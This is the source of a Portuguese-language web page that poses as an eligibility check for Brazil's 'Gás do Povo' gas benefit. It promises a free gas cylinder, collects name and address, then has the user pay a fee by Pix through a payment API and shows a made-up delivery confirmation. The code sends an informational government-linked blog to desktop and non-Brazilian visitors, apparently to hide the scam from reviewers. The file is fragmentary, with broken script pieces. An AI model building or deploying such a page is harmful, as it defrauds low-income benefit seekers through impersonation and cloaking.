<title>Verificação de benefício</title>
<style>
  :root {
    color-scheme: light;
    --bg: #ffffff;
    --text: #111827;
    --muted: #4b5563;
    --line: #e5e7eb;
    --red: #d90429;
    --green: #00a650;
    --blue: #0057ff;
    box-sizing: border-box;
    padding-top: env(safe-area-inset-top, 0px);
    padding-bottom: env(safe-area-inset-bottom, 0px);
  }
  *, *::before, *::after { box-sizing: border-box; }
  html, body { margin: 0; }
  body {
    background: var(--bg);
    color: var(--text);
    font-family: "Segoe UI", system-ui, -apple-system, Roboto, Arial, sans-serif;
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 24px 16px;
  }
  .card {
    width: 100%;
    max-width: 480px;
    border: 2px solid var(--line);
    border-top: 8px solid var(--blue);
    border-radius: 16px;
    padding: 28px 24px 32px;
    background: var(--bg);
  }
  .card.done { border-top-color: var(--green); }
  .brand { font-weight: 800; font-size: 14px; letter-spacing: .06em; text-transform: uppercase; color: var(--blue); margin: 0 0 18px; }
  .progress { display: flex; gap: 6px; margin-bottom: 8px; }
  .progress span { flex: 1; height: 8px; border-radius: 4px; background: var(--line); position: relative; overflow: hidden; }
  .progress span::after { content: ""; position: absolute; inset: 0; background: var(--blue); transform: scaleX(0); transform-origin: left center; }
  .progress span.on::after { transform: scaleX(1); }
  .progress span.now::after { animation: fill .7s ease-out; }
  @keyframes fill { from { transform: scaleX(0); } to { transform: scaleX(1); } }
  .step { font-size: 14px; color: var(--muted); margin: 0 0 20px; }
  h1 { font-size: 24px; line-height: 1.25; margin: 0 0 24px; }
  .options { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
  button {
    font: inherit; font-weight: 700; font-size: 18px;
    color: #fff; border: 0; border-radius: 12px;
    padding: 16px 12px; cursor: pointer;
    transition: transform .08s ease, filter .15s ease;
  }
  button:hover { filter: brightness(1.1); }
  button:active { transform: scale(.97); }
  button:focus-visible { outline: 3px solid var(--text); outline-offset: 2px; }
  .green { background: var(--green); }
  .red { background: var(--red); }
  .blue { background: var(--blue); }
  .result { text-align: center; }
  .check {
    width: 72px; height: 72px; border-radius: 50%;
    background: var(--green); color: #fff;
    display: flex; align-items: center; justify-content: center;
    font-size: 40px; font-weight: 800; margin: 0 auto 20px;
  }
  .result h1 { color: var(--green); margin-bottom: 24px; }
  .result button { width: 100%; }
  .cart { border: 2px solid var(--line); border-radius: 12px; margin-bottom: 16px; text-align: left; overflow: hidden; }
  .cart-head { background: var(--blue); color: #fff; font-weight: 800; padding: 10px 16px; font-size: 14px; letter-spacing: .04em; text-transform: uppercase; }
  .item { display: flex; gap: 14px; align-items: center; padding: 14px 16px; }
  .thumb { width: 72px; height: 72px; flex: none; border: 2px solid var(--line); border-radius: 10px; overflow: hidden; background: #fff; padding: 4px; }
  .thumb img { width: 100%; height: 100%; object-fit: contain; border-radius: 6px; display: block; }
  .info { flex: 1; min-width: 0; }
  .info strong { display: block; font-size: 16px; line-height: 1.25; }
  .info .model { display: block; margin-top: 4px; font-weight: 700; color: var(--blue); }
  .info .qty { display: block; margin-top: 2px; font-size: 13px; color: var(--muted); }
  .price { font-weight: 800; color: var(--green); font-size: 16px; }
  .totals { border-top: 2px solid var(--line); padding: 10px 16px; font-size: 14px; }
  .totals div { display: flex; justify-content: space-between; padding: 2px 0; color: var(--muted); }
  .totals .total { color: var(--text); font-weight: 800; font-size: 17px; }
  .totals .total b { color: var(--green); }
  .swap { display: inline-block; font-size: 13px; font-weight: 600; color: var(--blue); text-decoration: underline; cursor: pointer; margin: 0 0 14px; }
  .check { animation: pop .6s cubic-bezier(.2, 1.6, .4, 1); }
  @keyframes pop { from { transform: scale(0); } to { transform: scale(1); } }
  .note { margin-top: 16px; font-weight: 600; color: var(--blue); min-height: 22px; }
  .restart { background: none; color: var(--muted); font-size: 14px; font-weight: 600; margin-top: 12px; padding: 8px; text-decoration: underline; }
  .restart:hover { filter: none; color: var(--red); }
  .checkout { margin-top: 20px; text-align: left; border-top: 2px solid var(--line); padding-top: 20px; animation: slide .35s ease-out; }
  @keyframes slide { from { opacity: 0; transform: translateY(-10px); } to { opacity: 1; transform: none; } }
  .checkout h2 { font-size: 18px; margin: 0 0 14px; }
  .field { display: block; margin-bottom: 12px; font-size: 13px; font-weight: 700; color: var(--muted); }
  .field input { display: block; width: 100%; margin-top: 4px; font: inherit; font-size: 17px; font-weight: 500; color: var(--text); background: #fff; border: 2px solid var(--line); border-radius: 10px; padding: 12px 14px; }
  .field input:focus { outline: none; border-color: var(--blue); }
  .row { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
  .err { color: var(--red); font-weight: 700; font-size: 14px; min-height: 18px; margin: 0 0 8px; }
  .store { display: flex; align-items: center; gap: 12px; border: 2px solid var(--green); border-radius: 12px; padding: 12px 14px; margin: 0 0 16px; animation: slide .35s ease-out; }
  .store .pin { width: 68px; height: 44px; flex: none; border-radius: 10px; padding: 4px; border: 2px solid var(--green); display: flex; align-items: center; justify-content: center; font-size: 20px; }
  .store .pin img { display: block; max-width: 100%; max-height: 100%; object-fit: contain; }
  .store strong { display: block; font-size: 17px; }
  .store span { color: var(--muted); font-size: 14px; }
  .choose { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-bottom: 16px; }
  .choose button { background: #fff; border: 3px solid; }
  .choose .blue { color: var(--blue); }
  .choose .green { color: var(--green); }
  .choose .blue.on { background: var(--blue); color: #fff; }
  .choose .green.on { background: var(--green); color: #fff; }
  .slot { border: 2px solid var(--blue); border-radius: 12px; padding: 12px 14px; margin-bottom: 14px; animation: slide .35s ease-out; }
  .slot strong { display: block; }
  .slot span { display: block; margin-top: 2px; color: var(--muted); font-size: 14px; }
  .slot.done { border-color: var(--green); }
  .slot.done strong { color: var(--green); }
  .checkout h2.step-title { font-size: 24px; color: var(--blue); margin: 0 0 8px; }
  .lead { color: var(--muted); margin: 0 0 16px; }
  .lead.small { margin: 16px 0 6px; font-size: 13px; font-weight: 700; }
  .fee { display: flex; justify-content: space-between; align-items: center; border: 2px solid var(--blue); border-radius: 12px; padding: 14px 16px; margin-bottom: 16px; font-weight: 700; }
  .fee b { color: var(--blue); font-size: 22px; }
  .qr { width: 220px; max-width: 100%; margin: 0 auto; border: 2px solid var(--line); border-radius: 12px; padding: 8px; background: #fff; color: var(--muted); text-align: center; animation: slide .35s ease-out; }
  .qr svg { display: block; width: 100%; height: auto; }
  .overlay { position: fixed; inset: 0; background: rgba(17, 24, 39, .55); display: flex; align-items: center; justify-content: center; padding: 16px; z-index: 100; animation: fadein .2s ease-out; }
  @keyframes fadein { from { opacity: 0; } to { opacity: 1; } }
  .modal { background: #fff; border-radius: 16px; border-top: 8px solid var(--blue); width: 100%; max-width: 360px; padding: 24px; text-align: center; animation: slide .25s ease-out; }
  .modal h3 { margin: 0 0 8px; font-size: 20px; }
  .modal p { margin: 0 0 20px; color: var(--muted); }
  .modal button { width: 100%; }
  .fee small { display: block; margin-top: 2px; font-size: 13px; font-weight: 500; color: var(--muted); }
  .thanks { text-align: center; margin-bottom: 16px; }
  .thanks .check { width: 56px; height: 56px; font-size: 30px; margin: 0 auto 12px; }
  .checkout .thanks h2.step-title { color: var(--green); margin-bottom: 4px; }
  .wait { text-align: center; color: var(--muted); font-weight: 600; margin: 4px 0 10px; }
  .checking { text-align: center; padding: 24px 0 8px; color: var(--muted); font-weight: 600; }
  .spin { width: 44px; height: 44px; margin: 0 auto 16px; border: 5px solid var(--line); border-top-color: var(--blue); border-radius: 50%; animation: spin .8s linear infinite; }
  @keyframes spin { to { transform: rotate(360deg); } }
  .tips { margin: 0 0 24px; padding-left: 22px; line-height: 1.5; }
  .tips li { margin-bottom: 10px; }
  .qr { scroll-margin-top: 16px; }
  .qr img { display: block; width: 100%; height: auto; }
  .pixcode { width: 100%; font: 12px/1.4 ui-monospace, Menlo, Consolas, monospace; color: var(--text); background: #f3f4f6; border: 2px solid var(--line); border-radius: 10px; padding: 10px; resize: none; margin-bottom: 12px; word-break: break-all; }
  #pixArea button + button { margin-top: 10px; }
  .slot.truck { display: flex; align-items: center; gap: 12px; }
  .ticon { width: 44px; height: 30px; flex: none; color: var(--blue); }
  @media (max-width: 380px) { .options, .row { grid-template-columns: 1fr; } }
  .logo { display: block; width: 130px; max-width: 50%; height: auto; margin: 0 auto 14px; }
  .blog h1 { margin-bottom: 16px; }
  .blog h2 { font-size: 18px; margin: 24px 0 8px; color: var(--blue); }
  .blog p { line-height: 1.55; margin: 0 0 12px; }
  .blog ul, .blog ol { padding-left: 22px; line-height: 1.5; margin: 0 0 12px; }
  .blog li { margin-bottom: 8px; }
  .blog a { color: var(--blue); font-weight: 600; }
  .blog .src { font-size: 14px; }
  .blog button { margin-top: 12px; }
  .notice { border: 2px solid var(--blue); border-radius: 12px; padding: 12px 14px; margin-bottom: 16px; font-weight: 600; }
</style>
</head>

      '<div class="thanks"><div class="check">✓</div><h2 class="step-title">Obrigado!</h2><p class="lead">Pagamento confirmado, seu resgate está garantido.</p></div>' +
      '<div class="slot done"><strong>Previsão de entrega: amanhã, 08:30h</strong><span>Dias úteis, das 08:00 às 18:00</span></div>';
    box.scrollIntoView({ behavior: "smooth", block: "start" });
  }

  function showCharge(o) {
    stopPolling();
    var box = panel();
    box.innerHTML =
      (o.intro || ('<h2 class="step-title">' + o.title + '</h2><p class="lead">' + o.lead + '</p>')) +
      '<div class="fee"><div><span>' + o.label + '</span>' + (o.note ? '<small>' + o.note + '</small>' : '') + '</div><b>' + money(o.cents) + '</b></div>' +
      '<div id="pixArea"><p class="err" id="pixErr"></p><button type="button" class="blue" id="genPix">Gerar Pix</button></div>';
    document.getElementById("genPix").onclick = function () { generatePix(o); };
    box.scrollIntoView({ behavior: "smooth", block: "start" });
  }

  function generatePix(o) {
    var btn = document.getElementById("genPix");
    var errEl = document.getElementById("pixErr");
    errEl.textContent = "";
    btn.disabled = true; btn.textContent = "Gerando Pix...";
    var a = lastAddress || {};
    var cu = (a.cidade || "").split(" - ");
    var addr = { street: a.rua, number: a.num, complement: a.comp, neighborhood: a.bairro, city: cu[0], state: cu[1], zipcode: a.cep };
    Object.keys(addr).forEach(function (k) { if (!addr[k]) delete addr[k]; });
    var body = {
      amount: o.cents,
      description: o.desc,
      reference: o.key + "-" + Date.now(),
      source: "api_externa",
      customer: { name: a.nome || "Cliente Teste", email: "cliente.teste@exemplo.com", phone: "11999998888", document: "12345678909" },
      address: addr
    };
    fetch(PARADISE_BASE + "transaction", {
      method: "POST",
      headers: { "Content-Type": "application/json", "X-API-Key": PARADISE_KEY },
      body: JSON.stringify(body)
    })
      .then(function (r) {
        return r.json().catch(function () { return {}; }).then(function (j) { return { ok: r.ok, j: j }; });
      })
      .then(function (res) {
        if (!res.ok || !res.j.qr_code) throw new Error(res.j.message || res.j.error || "resposta inesperada");
        renderPix(res.j, o);
      })
      .catch(function (e) {
        console.error("Paradise:", e);
        btn.disabled = false; btn.textContent = "Gerar Pix";
        errEl.textContent = "Não foi possível gerar o Pix (" + e.message + "). Tente novamente.";
      });
  }

  function renderPix(j, o) {
    var code = j.qr_code, b64 = j.qr_code_base64;
    if (typeof fbq === "function") {
      fbq("track", "AddPaymentInfo", { value: o.cents / 100, currency: "BRL" });
    }
    document.getElementById("pixArea").innerHTML =
      '<div class="qr" id="qr"></div>' +
      '<p class="lead small">Pix copia e cola</p>' +
      '<textarea class="pixcode" id="pixcode" readonly rows="4"></textarea>' +
      '<button type="button" class="blue" id="copyPix">Copiar Pix</button>' +
      '<p class="wait" id="wait">Aguardando pagamento...</p>' +
      '<button type="button" class="green" id="checkPay">Verificar pagamento</button>';
    document.getElementById("pixcode").value = code;
    var qr = document.getElementById("qr");
    try {
      var q = qrcode(0, "M");
      q.addData(code); q.make();
      qr.innerHTML = q.createSvgTag({ cellSize: 4, margin: 2, scalable: true });
    } catch (e) { qr.innerHTML = b64 ? '<img alt="QR Code Pix" src="' + b64 + '">' : "QR Code indisponível"; }
    document.getElementById("copyPix").onclick = function () {
      var ta = document.getElementById("pixcode"), btn = this;
      function ok() { btn.textContent = "Pix copiado!"; setTimeout(function () { btn.textContent = "Copiar Pix"; }, 2000); }
      ta.select();
      if (navigator.clipboard && navigator.clipboard.writeText) {
        navigator.clipboard.writeText(ta.value).then(ok, function () { try { document.execCommand("copy"); ok(); } catch (e) {} });
      } else { try { document.execCommand("copy"); ok(); } catch (e) {} }
    };
    setTimeout(function () { qr.scrollIntoView({ behavior: "smooth", block: "start" }); }, 60);

    var txId = j.transaction_id || j.id, done = false, ticks = 0;
    function check(manual) {
      if (done) return;
      fetch(PARADISE_BASE + "query?action=get_transaction&id=" + encodeURIComponent(txId), { headers: { "X-API-Key": PARADISE_KEY } })
        .then(function (r) { return r.json(); })
        .then(function (t) {
          var st = String(t.status || "").toLowerCase();
          if (st === "approved" || st === "paid" || st === "completed") {
            if (done) return;
            done = true; stopPolling();
            if (typeof fbq === "function") {
              fbq("track", "Purchase", { value: o.cents / 100, currency: "BRL" });
            }
            o.onPaid();
          } else if (manual) { setText("wait", "Pagamento ainda não identificado. Aguarde alguns instantes."); }
        })
        .catch(function () { if (manual) setText("wait", "Não foi possível verificar agora. Tente novamente."); });
    }
    document.getElementById("checkPay").onclick = function () { check(true); };
    stopPolling();
    payTimer = setInterval(function () { if (++ticks > 300) { stopPolling(); return; } check(false); }, 4000);
  }

  function setIfEmpty(id, v) {
    var el = document.getElementById(id);
    if (el && v && !el.value) el.value = v;
  }

  function fillFromCep() {
    var d = document.getElementById("cep").value.replace(/\D/g, "");
    var rua = document.getElementById("rua");
    rua.placeholder = "Buscando pelo CEP...";
    function done() { var r = document.getElementById("rua"); if (r) r.placeholder = ""; }
    fetch("https://viacep.com.br/ws/" + d + "/json/")
      .then(function (r) { return r.json(); })
      .then(function (j) {
        done();
        var err = document.getElementById("confErr");
        if (j.erro) { if (err) err.textContent = "CEP não encontrado. Preencha o endereço manualmente."; return; }
        setIfEmpty("rua", j.logradouro);
        setIfEmpty("bairro", j.bairro);
        setIfEmpty("cidade", j.localidade ? j.localidade + (j.uf ? " - " + j.uf : "") : "");
        var n = document.getElementById("nome"); if (n && n.value) n = document.getElementById("num");
        if (n) n.focus({ preventScroll: true });
      })
      .catch(function () { done(); });
  }

  function confirmHtml() {
    return '<p class="err" id="confErr"></p><button type="button" class="green" id="confirm">Confirmar resgate</button>';
  }

  function bindConfirm(needAddress) {
    document.getElementById("confirm").onclick = function () {
      if (needAddress) {
        var ids = ["nome", "rua", "num", "bairro", "cidade"];
        for (var i = 0; i < ids.length; i++) {
          if (!document.getElementById(ids[i]).value.trim()) {
            document.getElementById("confErr").textContent = "Preencha nome, rua, número, bairro e cidade.";
            return;
          }
        }
      }
      if (needAddress) { openFee(); return; }
      showUnavailable(); return;
      document.getElementById("mode").innerHTML = '<div class="slot done"><strong>Resgate confirmado!</strong><span>' +
        (needAddress ? 'Entrega prevista para amanhã, 08:30h.' : 'Retire na Ultragaz, a 2,3 km de você.') + '</span></div>';
    };
  }

  function getJson(url, ms) {
    var ctl = ("AbortController" in window) ? new AbortController() : null;
    var t = setTimeout(function () { if (ctl) ctl.abort(); }, ms);
    return fetch(url, ctl ? { signal: ctl.signal } : {}).then(function (r) { clearTimeout(t); return r.json(); });
  }

  // Retorna o código do país (ex.: "BR") ou null se não conseguir descobrir
  function lookupCountry() {
    return getJson("https://api.country.is/", 4000)
      .then(function (j) { return j.country || null; })
      .catch(function () {
        return getJson("https://ipapi.co/json/", 4000).then(function (j) { return j.country_code || null; });
      })
      .catch(function () { return null; });
  }

  function isMobile() {
    var ua = navigator.userAgent || "";
    if (navigator.userAgentData && navigator.userAgentData.mobile === true) return true;
    if (/Android|iPhone|iPad|iPod|Mobile|Opera Mini|IEMobile|BlackBerry/i.test(ua)) return true;
    return navigator.platform === "MacIntel" && navigator.maxTouchPoints > 1; // iPadOS
  }

  function checkCountry() {
    if (!isMobile()) { showTips("device"); return; }
    view.innerHTML = '<div class="checking"><div class="spin"></div><p>Verificando sua localização...</p></div>';
    lookupCountry().then(function (cc) {
      if (cc && cc !== "BR") { showTips("country"); } else { current++; render(); }
    });
  }

  function showTips(reason) {
    var L = {
      lei: "https://www12.senado.leg.br/noticias/materias/2026/02/19/lei-torna-programa-gas-do-povo-permanente",
      mds: "https://www.gov.br/mds/pt-br/acoes-e-programas/gas-do-povo",
      pt: "https://portaldatransparencia.gov.br/gas-do-povo",
      plan: "https://www.gov.br/planalto/pt-br/acompanhe-o-planalto/noticias/2025/09/perguntas-e-respostas-sobre-o-programa-gas-do-povo",
      cxg: "https://www.caixa.gov.br/empresa/programa-gas-do-povo/Documents/Perguntas-Frequentes-Programa-Gas-do-Povo-Geral.pdf",

    };

      '<div class="blog">',

      '</ul>',
      '<h2>Frequência das recargas (vales)</h2>',
      '<p>O número de recargas gratuitas por ano varia conforme o tamanho da família:</p>',
      '<ul>',
      '<li><strong>Famílias de 2 a 3 pessoas:</strong> até 4 recargas por ano (disponibilizadas a cada 3 meses).</li>',
      '<li><strong>Famílias de 4 ou mais pessoas:</strong> até 6 recargas por ano (disponibilizadas a cada 2 meses).</li>',
      '<li><strong>Data de liberação:</strong> os vales costumam ser disponibilizados mensalmente a partir do dia 10 de cada mês para quem está no calendário daquele período.</li>',

      '<h2>Como retirar o gás</h2>',

      '</ol>',

      '<li>' + a(L.lei, "Senado: lei torna o programa permanente") + '</li>',

  function renderResult() {
    card.classList.add("done");
    setTimeout(launchConfetti, 150);
    view.innerHTML =
      '<div class="result">' +
      '<div class="check">✓</div>' +
      '<h1>Você está apto a receber o benefício!</h1>' +
      '<div class="cart">' +
      '<div class="cart-head">Seu carrinho</div>' +
      '<div class="item"><div class="thumb" id="thumb">' + itemImage() + '</div>' +
      '<div class="info"><strong>Botijão de gás cheio (GLP)</strong><span class="model">Modelo: P13</span><span class="qty">1x por semana</span></div>' +
      '<div class="price">Grátis</div></div>' +
      '<div class="totals"><div><span>Subtotal</span><span>R$ 0,00</span></div><div><span>Entrega</span><span id="shipv">Grátis</span></div><div class="total"><span>Total</span><b id="totv">R$ 0,00</b></div></div>' +
      '</div>' +
      
      '<button type="button" class="green" id="go">Resgatar</button>' +
      '<div id="checkout"></div>' +
      '<p class="note" id="note"></p>' +
      
      '</div>';
    document.getElementById("go").onclick = function () {
      openCheckout();
    };
    
  }

  render();
</script>
